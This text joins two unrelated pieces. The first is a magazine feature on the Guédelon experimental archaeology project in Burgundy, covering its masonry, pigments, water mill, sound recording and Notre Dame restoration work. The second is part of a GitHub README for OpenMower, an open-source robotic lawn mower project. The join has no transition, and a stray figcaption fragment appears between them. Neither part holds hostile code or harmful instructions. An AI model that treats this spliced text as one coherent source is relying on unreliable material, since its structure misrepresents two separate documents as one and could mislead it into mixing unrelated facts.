<p>He strides out from the burly two-tower main gatehouse and scrambles down to the exterior foundations of the Chapel Tower. With his measuring stick—articulated in both modern centimeters and the inches and feet thirteenth-century masons used, which are almost identical to today’s—Renucci gestures at a section of Guédelon’s very first wall. The stone blocks here are precisely fitted and smoothly dressed, a visible contrast with the rest of the walls’ masonry. It looks as though stoneworkers had begun building a different castle entirely. “When we started, we tried to make the stones very uniform, very planned, because we learned at masonry school that this is a better way,” Renucci says. But each stone took two days to cut and dress. In the thirteenth century, masons usually collected their fees in weeks worked, not stones cut. Could the budget-conscious seigneur of Guédelon really have afforded this? Did he have time to wait for a roof over his head and walls to protect his family?</p>



<p>As he has done countless times over his Guédelon career, Renucci looked to France’s wealth of medieval archaeology. In its imagined story, Guédelon was founded just after the rule of Philip II (reigned 1180–1223), the first ruler to style himself king of France. Philip doggedly expanded the throne’s domain to include most of the area under the French flag today, in part through a campaign of building defensive fortifications in a signature Philippian style that his vassals mimicked. Around 100 such fortresses survive in France, a primary reason that 1228 was the date chosen to establish Guédelon. One Philippian castle stands largely unmodified in Dourdan, just southwest of Paris, and “predates” Guédelon by just a few years. The walls of Dourdan Castle, Renucci noticed, were faced with irregular, roughly dressed blocks, inspiring him to alter his course. “When we changed methods, we were able to make four stones in one day,” he says. “Our mindset today is to take your iPhone and say, ‘Can I order wood or stone in 20 hours?’ The primary challenge of building Guédelon is to forget the twenty-first century.”</p>



<p>Renucci heads back into the castle, climbs a spiral staircase, and follows the wall-walk to the stonemasons’ pièce de résistance for 2025, the upper level of the gatehouse. Above the gate, masons and carpenters will soon add an arch, a lintel, a portcullis, and a “murder hole”—a maw through which defenders could throw rocks and pour hot pitch on marauders. The design of the 2,000-pound portcullis is an educated guess; there are no working thirteenth-century originals left. Faucherre, who is studying the medieval Louvre Castle in Paris and the Aigues-Mortes ramparts in the south of France for inspriation, was flummoxed by the question of how a portcullis counterweight mechanism would have functioned at these sites. But his conversations with the Guédelon team this year have helped him envision the machines. “We can never be sure,” Faucherre says, “but now we are obliged to make a portcullis that can move.”</p>

<p>The murder hole will remain purely ornamental. “This is a very pacifist castle,” laughs stonemason Yaniv Gammeter. “Very anti-violence here.” In truth, local Guédelon-size Philippian castles such as those at Ratilly, Druyes, and Saint-Vérain weren’t equipped for serious warfare. “You can view these castles as a type of very large manor house,” Gammeter says. “They’re symbols of power but weren’t meant to survive a siege.”</p>



<p><strong>As Guédelon has grown</strong>, so have the possibilities. Why stop at a castle? In the thirteenth century, people here would have painted, prayed, farmed, milled flour, fell ill, recovered, and listened to the leaves and birds to get the day’s weather report. Vanishingly little evidence of those activities can be found by excavating, and thus the artisans and researchers at Guédelon have to get creative. Lachény, the painter, has concocted no fewer than 17 pigments from local ores and plant material, some of which she’s found in the forest herself. While retrieving a bowl of fine dark ocher powder from her oven, she explains that glands on cherry tree leaves, when crushed, boiled, and made into paste, produce a reddish-black hue. In their atelier, the painters glide around color-spattered stacks of mixing bowls, shelves of ceramics, swatches of linen, and trays of yellow, pink, gray, and blue powders. New colors occasionally arrive unannounced. “Sometimes a quarryman cleaving stones comes over saying, ‘I found this,’” says Lachény, who investigates whether the discovery can be useful for her work or for some other endeavor in the castle.</p>



<p>Twelfth- and thirteenth-century wall paintings rarely survive, but some of the most intact examples in France can be found in the Church of Saint Peter and Saint Paul in Moutiers-en-Puisaye, just two miles from Guédelon. Around images of angels, saints, and Adam and Eve, medieval masters enlivened the walls with bright orange flowers, slate-blue stars, and unruly golden vines, motifs that inspired Lachény’s decoration of the Great Hall’s antechamber. “It’s got plenty of spirit, it’s joyful,” she says. “We talk about Dark Ages, but the Middle Ages were really colorful.”</p>



<p>The Middle Ages were also noisy, and sound has proven crucial to the successful construction of a thirteenth-century water mill, one of Guédelon’s more daunting experiments. In 2008, a rescue excavation turned up two medieval mills in eastern France near the village of Thervay. An exceptional trove of 200 wood fragments was preserved from one mill. Using these fragments as their guide, Guédelon’s carpenters spent two years fabricating their own mill. It croaked and creaked, but nevertheless, the millstones barely budged. The miller, Constantin Lemesle, decided to let it run until wood started snapping. “If we don’t make mistakes, we can’t understand the machine,” he says. With a working design on the first try, the mill would have produced plenty of flour but no knowledge. Finally, Lemesle says, the mill is singing.</p>

<p>In the past decade, as Guédelon has evolved with endeavors such as the mill, more scientists have come to see and hear all the commotion. Mylène Pardoën, a soundscape archaeologist at the Center of Social Sciences and Humanities, Lyon Saint-Étienne, has visited Guédelon 23 times since 2020 with her arsenal of microphones, which she pokes into the millstones, the cracking quarry slabs, and the fires of the forge. “The thirteenth century sounds different, and every material transmits information,” she says. In 2023, relying almost entirely on data collected at Guédelon, Pardoën composed a four-minute surround-sound reconstruction of the building site of Paris’ Notre Dame Cathedral circa 1170.</p>



<p><strong>After 11 years</strong> of repeatedly fixing Guédelon’s finicky grain-crunching contraption, Lemesle can imagine the whole medieval community’s relationship to the mill. The seigneur collected taxes in the spring for its operation. Peasants in the fiefdom could bake or buy abundant, nutrient-rich bread, leaving time to raise animals and plant crops, an investment toward an energetic summer dedicated to working the fields. In years when the skies failed to provide rain, flour would have to be milled by animal or manual labor, and there’d be fewer hands to, say, build a castle.</p>



<p>How groups and systems functioned or fell apart in the Middle Ages is what the work at Guédelon illuminates above all else for archaeologists. “We’re putting pieces into a big puzzle,” says archaeologist Anne Baud of Lumière University Lyon 2, director of excavations at Cluny Abbey in east-central France. This abbey was enormous, its twelfth-century basilica’s vaults rising nearly 100 feet—then the highest in Western Europe. Nothing like it had ever been built. “You would think there must have been hundreds and hundreds of builders who were working there,” says Baud. “But is that true?” At Guédelon, she and other archaeologists have observed that medieval labor was likely leaner, more collaborative, and more synchronized than accounts of the time suggest. “The empirical knowledge we gain,” Baud says, “is linked to Guédelon’s laborers’ experience.”</p>

<p><strong>The Guédelon project</strong> and its artisans have begun to make their mark on restoration efforts across France. When Notre Dame Cathedral burned in 2019, the team was summoned for their highest-profile contribution. (See “<a href="https://archaeology.org/issues/march-april-2022/features/notre-dame-restoration/" target="_blank" rel="noreferrer noopener">Exploring Notre Dame’s Hidden Past</a>.”) Renucci, along with six of Guédelon’s carpenters, set off to help rebuild the Forest, the immense timber framework of the cathedral’s roof. Conventional wisdom held that clear-cutting and drying centuries-old oaks would be required to replicate the original structure. But the Guédelon carpenters knew better. They’d built a formidable oak trusswork for Guédelon’s Great Hall several years earlier, learning that smaller, younger oaks, freshly cut and green with moisture, were more pliable. The crew brought along 60 custom-fitted medieval axes, forged at their castle, to equip the Forest’s carpenters. “I’m very proud of this,” says Martin, Guédelon’s proprietor. “It’s necessary to have dreams together.”</p>



<p>No one expects the Guédelon reverie to end any time soon. Baud and Renucci are now hashing out plans for a Guédelon church in the forthcoming Guédelon village, which is still on the drawing board. On a sunny afternoon, Renucci stops by Ratilly Castle for ideas. He traces the courses of stone, pulls weeds from cracks in the mortar, and inspects long-ago quarrier’s marks and scaffolding holes. He starts to forget the twenty-first century, his mind on gates and portcullises and spectral guards heaving them open and clanging them shut. The castle’s centuries-old knotty oak door, heavy with a mess of iron bolts and locks, catches his eye. “Very interesting, this kind of system,” Renucci muses, snapping a photo of an entryway he has walked through dozens of times. “You come for stone, and you notice wood. That’s the magic thing about a castle.”</p>

<p>Slideshow: Building the Last Medieval Castle</p>



<p><strong>Philip II</strong>, the first ruler to style himself king of France, reigned from 1180 to 1223, but some of the 100 or so surviving French castles designed in the Philippian style postdate the king’s death by decades. In fact, work on the newest example of the style, Guédelon Castle, began in 1998. In the quarter-century since construction started in the forested Puisaye region of Burgundy, Guédelon has become one of the world’s most comprehensive and longest-running experimental archaeology projects. Everything done on site, from mixing lime mortar to cutting timber beams to weaving baskets, uses only thirteenth-century tools, techniques, and materials. Guédelon’s 40 stonemasons, woodcutters, weavers, painters, blacksmiths, and other artisans draw inspiration from contemporaneous sites and texts. Each obstacle they encounter is an opportunity to solve a problem, medieval-style, and to fill a gap in archaeologists’ knowledge of the era.</p>

Archaeologist Anne Baud has observed trowel marks in the lime mortar at medieval sites all over the world. At Guédelon, she noticed that when masons made similar scrapes in the mortar, calcite squeezed out, drying into a protective facing over the seams between stones. This is one of many medieval construction techniques that the Guédelon experiment has demystified.</figcaption></figure>

<p><strong>Blacksmiths Caroline Hasne</strong> and Mathis Lacroix forge a tool for making nails. Hasne, a new employee in a very old job, likes the work so far. “I love to try to re-create some old techniques that we don’t see anymore by studying old objects,” she says. “And I’m paid to do it!” (Credit: Ben O’Donnell)</p>

<p>Video: Guédelon’s Mighty Mill</p>



<p><strong>The water mill</strong> in Guédelon Forest comes to life each spring, weather permitting. Its design follows a medieval mill found in 2008 in the village of Thervay, 160 miles east of Guédelon. That machine was only preserved in fragments of wood, and no one knew how such a thing would run in practice. In the first years of the Guédelon mill’s operation, the upright wooden cogs on the small horizontal gear proved brittle. They were replaced with ones notched along the grooves of the wood. Pig-fat grease was swapped out for cow fat. Spring brought the right amount of rain. Et voilà! (Credit: Ben O’Donnell)</p>

<p dir="auto"><b>This project is active!</b></p>
<p dir="auto">This is the hardware repository, so it might seem that the project is inactive, since hardware is pretty stable by now.
Most of the development work is done on the ROS code here: <a href="https://github.com/ClemensElflein/open_mower_ros">https://github.com/ClemensElflein/open_mower_ros</a></p>

<p dir="auto"><h2 tabindex="-1" dir="auto">About the Project</h2><a id="user-content-about-the-project" aria-label="Permalink: About the Project" href="#about-the-project"></a></p>
<p dir="auto">If you want to see a quick overview, you can check out this video:</p>
<p dir="auto">
  <a href="https://www.youtube.com/watch?v=BSF04i3zNGw" rel="nofollow"><img src="https://user-images.githubusercontent.com/2864655/161540069-f4263fa7-a47b-49d2-a7bc-d1cdc3a47704.jpg"></a>
</p>
<p dir="auto">Let's be honest: The current generation of robotic lawn mowers sucks. Basically all of these bots drive in a random direction until they hit the border of the lawn, rotate for a randomized duration and repeat. <strong>I think we can do better!</strong></p>
<p dir="auto">Therefore, we have disassembled the cheapest off-the-shelf robotic mower  we could find (YardForce Classic 500) and were surprised that the hardware itself is actually quite decent:</p>
<ul dir="auto">
<li>Geared sensored brushless motors for the wheels</li>
<li>A sensored brushless motor for the mower motor itself</li>
<li>The whole construction seems robust, waterproof and all in all thought through</li>
<li>All components are connected using standard connectors, therefore upgrading the hardware is easily possible.</li>
</ul>
<p dir="auto">The bottom line is: The bot itself is surprisingly high quality and doesn't need to be changed at all. <strong>We just need some better software in there</strong>.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Project Goals</h2><a id="user-content-project-goals" aria-label="Permalink: Project Goals" href="#project-goals"></a></p>
<p dir="auto">Here is a quick overview of this project's goals:</p>
<p dir="auto">✔️ <strong>Autonomous Lawn Mowing:</strong> Obviously, the device should be able to mow the lawn automatically.</p>
<p dir="auto">✔️ <strong>Good Safety:</strong> The device must be safe, e.g. emergency stop if lifted or crashed.</p>
<p dir="auto">✔️ <strong>No Perimeter Wire Needed:</strong> We want to be flexible and support multiple mowing areas.</p>
<p dir="auto">✔️ <strong>Low Cost:</strong> It should be cheaper than a mid range off-the-shelf product</p>
<p dir="auto">✔️ <strong>Open:</strong> I want to share knowledge and enable others to build an OpenMower as well.</p>
<p dir="auto">✔️ <strong>Nice to Look At:</strong> You should not be ashamed to have an OpenMower mowing your lawn.</p>
<p dir="auto">✔️ <strong>Avoid Obstacles:</strong> The mower should detect obstacles and avoid them during mowing.</p>
<p dir="auto">✔️ <strong>Rain Detection:</strong> The device should be able to detect bad weather conditions and pause mowing until they improve.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Open Mower App</h2><a id="user-content-open-mower-app" aria-label="Permalink: Open Mower App" href="#open-mower-app"></a></p>

<p dir="auto"><h2 tabindex="-1" dir="auto">Current State</h2><a id="user-content-current-state" aria-label="Permalink: Current State" href="#current-state"></a></p>
<p dir="auto">The basic mowing function finally works! As you can see in the video, map teaching and mowing work as expected. It even returns to the docking station automatically as soon as the battery gets low and continues once it's recharged.</p>
<p dir="auto">At this point I can recommend that brave tech savvy users can build one for themselves! Since it's quite an expensive and complex project, please don't be shy and ask if you have any questions. I'm glad to help 🙂</p>
<p dir="auto"><h3 tabindex="-1" dir="auto">Hardware</h3><a id="user-content-hardware" aria-label="Permalink: Hardware" href="#hardware"></a></p>
<p dir="auto">By now we have a stable revision of the mainboard as well as two motor controllers to go with it. The <a href="https://github.com/clemensElflein/xesc">xESC mini</a> and the <a href="https://github.com/clemensElflein/xesc2040">xESC 2040</a>. I'm currently using the xESC mini for my builds and it works very well. The problem with this controller is, its parts are currently hard to source. That's why we created the xESC 2040 based on the RP2040 chip. This is the low-cost variant and its support is currently experimental.</p>
<p dir="auto"><h4 tabindex="-1" dir="auto">Hardware To-Do:</h4><a id="user-content-hardware-to-do" aria-label="Permalink: Hardware To-Do:" href="#hardware-to-do"></a></p>

<p dir="auto">You can help by starting an OpenMower build of your own. This helps to validate the concept and helps to create useful documentation for new users.</p>
<p dir="auto">Additionally, you can help by starring 🌟 and watching 👀 this repository, since it will help with visibility. You can also subscribe to my <a href="https://youtube.com/c/ClemensElflein" rel="nofollow">YouTube channel</a>.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Compatible Robotic Mowers</h2><a id="user-content-compatible-robotic-mowers" aria-label="Permalink: Compatible Robotic Mowers" href="#compatible-robotic-mowers"></a></p>
<p dir="auto">While disassembling the bot, I wondered about its mainboard: Instead of "YardForce" it read "GForce". After checking the internet for "GForce" robots, I found that that very similar looking robotic mowers are sold under the Herkules brand. Naturally I tried to dig deeper and actually found evidence that the mainboard is manufactured by some chinese company (SUMEC Hardware).</p>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="https://github.com/ClemensElflein/OpenMower/blob/main/img/mainboard.jpg"><img src="https://github.com/ClemensElflein/OpenMower/raw/main/img/mainboard.jpg" alt="GForce Robot Mower Mainboard"></a></p>
<p dir="auto">It is therefore quite safe to assume that many robot mowers are basically the same device in a different case. This would be a huge win for the community, since this would mean that by making one of those robots smarter, we could upgrade lots of robots.</p>
<p dir="auto">Therefore it might be a good idea to start a list of compatible devices. So if you have a cheap robotic lawn mower, you can check, if it was already disassembled in the list below. If it's not there, it would be nice of you to check, if it contains the same mainboard as ours and add your robot to the list with some some pictures / model numbers.</p>
<p dir="auto"><h3 tabindex="-1" dir="auto">List of Compatible Mowers</h3><a id="user-content-list-of-compatible-mowers" aria-label="Permalink: List of Compatible Mowers" href="#list-of-compatible-mowers"></a></p>
<p dir="auto">By now, some guys have disassembled their mowers and it doesn't look as good as I initially hoped. The GForce boards are basically just used by YardForce and some rebranded versions for the EU market. My exact hardware was only found in the mower I'm using (YardForce Classic 500) and in recently manufactured SA650 ECOs. The SA650 has a different chassis and we don't have a way of mounting the GPS antenna yet. Therefore at the moment, the only compatible mower is mine (the YardForce Classic 500).</p>
<p dir="auto">If you want to have a look at the disassembled mowers, check the Google Docs <a href="https://docs.google.com/spreadsheets/d/1BX0-KEs5v-VED8-RA4BLE-wRdXHtlmcKy4n9K5vJVAA" rel="nofollow">here</a></p>
